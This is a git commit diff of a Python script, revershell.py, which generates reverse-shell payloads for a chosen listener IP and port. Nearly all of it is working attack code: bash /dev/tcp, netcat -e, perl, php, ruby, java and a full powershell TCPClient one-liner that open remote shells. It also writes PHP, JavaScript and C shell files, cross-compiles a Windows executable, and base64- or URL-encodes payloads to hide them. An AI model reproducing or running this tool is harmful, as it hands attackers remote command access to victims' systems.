ec65283f9ef08521676e6be874c3b9d91bba5b48
jac11 <jac11devel@gmail.com>
2022-09-13 23:49:49 -0400

    Add files via upload

--- revershell.py
+++ revershell.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-
+#sudo apt-get install gcc-mingw-w64
+#sudo apt-get install mingw-w64
 
 import time
 import argparse
@@ -7,13 +8,14 @@ import sys
 import os
 import base64
 import binascii
+import urllib.parse
 
 class Reverse_Shell_Generator:
         def __init__(self):
             self.control()
             self.Selcet()
         def Selcet(self):
-            if "python" in self.args.type:
+            if "python" in self.args.type and not self.args.onefile :
                 if not self.args.windows:
                    self.result = "python3 -c "\
                           +"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\
@@ -25,7 +27,8 @@ class Reverse_Shell_Generator:
                                        +f'{self.args.LHOST}'+","+f'{self.args.LPORT}'\
                                        +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
                                        os.dup2(s.fileno(),2);p=subprocess.call(['C:\WINDOWS\system32\cmd.exe']);"
-                self.Base64() 
+                self.Base64()
+            
             elif "bash" in self.args.type:
                     self.result=  "bash -i >& /dev/tcp/"+f'{self.args.LHOST}'+"/"+f'{self.args.LPORT}'+" 0>&1" 
                     self.Base64() 
@@ -34,40 +37,47 @@ class Reverse_Shell_Generator:
                         +";$p="+f'{self.args.LPORT}'+";socket(S,PF_INET,SOCK_STREAM,getprotobyname("\
                         +'"tcp"'+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+'">&S"'\
                         +");open(STDOUT,"+'">&S"'+");open(STDERR,"+'">&S"'+");exec("+'"sh -i"'+");};'"
-                 self.Base64() 
+                 self.Base64()
+               
             elif 'php' in self.args.type and not  self.args.pentestmonkey:
                  
                  self.result = "php -r '$sock=fsockopen("+'"'+f'{self.args.LHOST}'\
                          +'"'+","+f'{self.args.LPORT}'+");exec("\
                          +'"/bin/sh -i <&3 >&3 2>&3"'+");'"
                  self.Base64() 
+             
             elif 'ruby' in self.args.type:
                  self.result = "ruby -rsocket -e'f=TCPSocket.open("+'"'\
                         +f'{self.args.LHOST}'+'"'+","+f'{self.args.LPORT}'\
                         +").to_i;exec sprintf("+'"/bin/sh -i <&%d >&%d 2>&%d"'\
                         +",f,f,f)"+"'"
                  self.Base64() 
+                
             elif 'netcat' in self.args.type or 'nc' in self.args.type:
                  if not self.args.windows:
                        self.result = "nc -e /bin/sh"+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                  else:
                      if self.args.windows:
                        self.result = "nc.exe -e cmd "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
-                 self.Base64() 
+                 self.Base64()
+                 self.URL_encode() 
             elif 'xterm' in self.args.type:
                  self.result = 'xterm -display '+f'{self.args.LHOST}'+':'+f'{self.args.LPORT}'
                  self.Base64() 
+                 
             elif 'java' in self.args.type  and len(self.args.type)==4:
                   self.result = 'self.result = Runtime.getRuntime()'+'\n'+'process = self.result.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'\
                            +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'\
                            +'\n'+'process.waitFor()'
-                  self.Base64()        
+                  self.Base64()   
+                    
             elif 'powershell'  in self.args.type:
                  self.result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
                  self.Base64()
+            
             elif 'php' in self.args.type  and self.args.pentestmonkey :
-                  if os.path.exists('PHP.php'):
-                     os.remove("PHP.php")
+                  if os.path.exists('./Store_shell/PHP.php'):
+                     os.remove("./Store_shell/PHP.php")
                   else:
                        pass
                   LHOST = "$ip =  '"+f'{self.args.LHOST}'+"';"
@@ -85,11 +95,11 @@ class Reverse_Shell_Generator:
                       else: 
                          line = line.replace("$ip = 'LHOST';",LHOST)
                          line = line.replace("$port = LPORT;",LPORT)     
-                      with open('PHP.php','a') as PHP_shell :
+                      with open('./Store_shell/PHP.php','a') as PHP_shell :
                            write_shell = PHP_shell.write(line)   
-            elif 'javascript' in self.args.type and len(self.args.type)==10:
-                  if os.path.exists('javascript.js'):
-                     os.remove("javascript.js")
+            elif 'js' in self.args.type and len(self.args.type)==2:
+                  if os.path.exists('./Store_shell/javascript.js'):
+                     os.remove("./Store_shell/javascript.js")
                   else:
                        pass
                   Orgenal_Host = """"var host = 'LHOST';" +"""
@@ -108,11 +118,11 @@ class Reverse_Shell_Generator:
                       else:
                            line = line.replace(Orgenal_Host,LHOST)
                            line = line.replace(Oragenal_port,LPORT)  
-                      with open('javascript.js','a') as PHP_shell :
+                      with open('./Store_shell/javascript.js','a') as PHP_shell :
                            write_shell = PHP_shell.write(line)    
             elif 'exe' in self.args.type and len(self.args.type)==3:
-                  if os.path.exists('shell.c'):
-                     os.remove("shell.c")
+                  if os.path.exists('./Store_shell/shell.c'):
+                     os.remove("./Store_shell/shell.c")
                   else:
                        pass
                   Orgenal_Host = """char host[] = "LHOST";"""
@@ -124,49 +134,68 @@ class Reverse_Shell_Generator:
                   for line in read_php:
                       line = line.replace(Orgenal_Host,LHOST)
                       line = line.replace(Oragenal_port,LPORT)  
-                      with open('shell.c','a') as PHP_shell :
+                      with open('./Store_shell/shell.c','a') as PHP_shell :
                            write_shell = PHP_shell.write(line)   
                   if self.args.compile32:
-                     os.system("i686-w64-mingw32-g++ shell.c -o shell32.exe -lws2_32 -lwininet -s\
+                     os.system("i686-w64-mingw32-g++ ./Store_shell/shell.c -o ./Store_shell/shell32.exe -lws2_32 -lwininet -s\
                                 -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")                  
-                  os.remove("shell.c")
+                  os.remove("./Store_shell/shell.c")
             
-            elif 'pyinstaller' in self.args.type :
-                  if os.path.exists('pyshell.py'):
-                     os.remove("pyshell.py")
+            elif 'python' in self.args.type and self.args.windows  and self.args.onefile :
+                  if os.path.exists('./Store_shell/pyshellwindows.py'):
+                     os.remove("./Store_shell/pyshellwindows.py")
                   else:
                        pass
                   Orgenal_Host = "LHOST = ''"
                   Oragenal_port = "LPORT = 0"
                   LHOST = "LHOST = '"+f'{self.args.LHOST}'+"'"
                   LPORT = "LPORT = "+f'{self.args.LPORT}'
-                  with open ('./resources/pythonshell.txt' ,'r') as javascript:
-                             read_php = javascript.readlines()
+                  with open ('./resources/pythonshellwindows.txt' ,'r') as pywin:
+                             read_php = pywin.readlines()
                   for line in read_php:
                       line = line.replace(Orgenal_Host,LHOST)
                       line = line.replace(Oragenal_port,LPORT)  
-                      with open('pyshell.py','a') as PY_shell :
+                      with open('./Store_shell/pyshellwindows.py','a') as PY_shell :
                            write_shell = PY_shell.write(line)
-                  os.system("pyinstaller --noconsole --onefile --noupx pyshell.py ")#2>/dev/null")                 
+            elif 'python' in self.args.type and  not self.args.windows  and self.args.onefile :
+                  print("q")
+                   
+                  if os.path.exists("./Store_shell/pyshellLinux.txt"):
+                     os.remove("./Store_shell/pyshellLinux.txt")
+                  else:
+                       pass
+                  Orgenal_Host = "LHOST = ''"
+                  Oragenal_port = "LPORT = 0"
+                  LHOST = "LHOST = '"+f'{self.args.LHOST}'+"'"
+                  LPORT = "LPORT = "+f'{self.args.LPORT}'
+                  with open ('./resources/pyshellLinux.txt' ,'r') as pylin:
+                             read_php =pylin.readlines()
+                  for line in read_php:
+                      line = line.replace(Orgenal_Host,LHOST)
+                      line = line.replace(Oragenal_port,LPORT)  
+                      with open('./Store_shell/pyshellLinux.py','a') as PY_shell :
+                           write_shell = PY_shell.write(line)                 
+                           
         def control(self):    
             parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
             parser.add_argument("-t",'--type'            , metavar='' , action=None  ,required = True ,help   ="type of payload ") 
             parser.add_argument("-i","--LHOST"           , metavar='' , action=None  ,required = True ,help   ="listner ip ' Local Host'") 
             parser.add_argument("-p","--LPORT"           , metavar='' , action=None  ,required = True ,help   ="Listner port ")   
-            parser.add_argument("-o","--output"          , metavar='' , action=None                   ,help   ="save the payload into the file")      
+            parser.add_argument("-o","--output"          , action='store_true'                        ,help   ="save the payload into the file")      
             parser.add_argument("-B64","--base64"        , action='store_true'                        ,help   ="encode the payload to base64 encode ")  
             parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help   ="genteate php pentestmonkey payload file ") 
             parser.add_argument("-W","--windows"         , action='store_true'                        ,help   ="gentate reverseshell  for windows operating system ")
             parser.add_argument("-C32","--compile32"     , action='store_true'                        ,help   ="compile C code to exe executable 32 bit ")
-            parser.add_argument("-PY","--pyinstaller"     , action='store_true'                       ,help   ="compile C code to exe executable 32 bit ")
-            self.args = parser.parse_args()        
+            parser.add_argument("-F","--onefile"         , action='store_true'                        ,help   ="genetate python script revelshell  ")
+            parser.add_argument("-UD","--urlencode"      , action='store_true'                        ,help   ="encode url format ")
+            self.args = parser.parse_args()         
             if len(sys.argv)!=1 :
                pass
             else:
                parser.print_help()         
                exit()
         def Base64(self):
-             if self.args.base64:
+             if self.args.base64 :
                   if 'powershell' in self.args.type:
                        self.result = 'powershell -e "'+ base64.b64encode(self.result.encode('utf-16')[2:]).decode()+'"'
                        print(self.result)
@@ -175,12 +204,20 @@ class Reverse_Shell_Generator:
                       self.result = base64.b64encode(self.result)
                       self.result = str(self.result).replace("b'",'',1).replace("'",'')
                       print(self.result)
+             elif self.args.urlencode :
+                  self.URL_encode()       
              else:
                   print(self.result)
              if self.args.output:
-                with open(self.args.output,'w') as File_write :
+                with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
                      File_write.write(self.result)     
-  
+        def URL_encode (self):
+            if self.args.urlencode :
+                 self.result = urllib.parse.quote(self.result)
+                 print(self.result)
+            if self.args.output:
+                with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
+                     File_write.write(self.result)           
 if __name__=='__main__':
    Reverse_Shell_Generator()  
 
